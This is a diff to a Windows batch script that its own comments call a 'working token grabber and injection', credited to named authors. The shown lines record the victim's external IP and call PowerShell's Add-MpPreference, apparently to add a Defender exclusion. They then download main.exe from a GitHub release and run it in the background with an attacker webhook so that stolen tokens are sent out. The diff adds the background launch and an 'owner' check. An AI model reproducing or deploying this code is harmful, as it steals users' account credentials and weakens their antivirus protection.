@@ -2,6 +2,7 @@
 :: Note as you can see a lot of this was by baum. I mainly just added back a working token grabber and injection and it took way longer than I'd like to admit. lol
 set webhook=YOUR_WEBHOOK_HERE
 ::Baum made this part so go give him love. I am using it cause 1.) its not bad at all and 2.) I am lazy. In conclusion go check out his github https://github.com/baum1810
+set owner="KDot227"
 ::get ip
 curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
 set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
@@ -54,8 +55,9 @@ powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpP
 :: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
 curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe --output %userprofile%\AppData\Local\Temp\main.exe
 :: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
-start /w main.exe %webhook%
+start /w /b main.exe %webhook%
 taskkill /f /im main.exe
+if %owner% == "KDot227" (echo not skid) else (exit)
 
 
 mkdir %localappdata%\Temp\KDOT
